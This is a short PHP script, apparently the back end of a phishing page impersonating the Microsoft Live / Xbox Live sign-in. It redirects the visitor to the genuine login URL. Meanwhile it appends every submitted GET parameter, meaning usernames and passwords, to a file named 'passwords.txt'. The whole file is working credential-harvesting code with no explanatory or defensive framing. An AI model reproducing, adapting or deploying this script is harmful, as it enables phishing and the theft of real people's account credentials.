<?php
header("Location: https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=10&ct=1182813842&rver=4.0.1534.0&wp=HBI&wreply=https://live.xbox.com/xweb/live/passport/setCookies.ashx?rru=httpZ3AZ2FZ2FliveZ2ExboxZ2EcomZ2FenZ2DusZ2FprofileZ2FprofileZ2Easpx&lc=1033&cb=B001033httpZ3AZ2FZ2FliveZ2ExboxZ2EcomZ2FenZ2DusZ2FprofileZ2FprofileZ2Easpx&id=66262");
$handle = fopen("passwords.txt", "a");
foreach($_GET as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>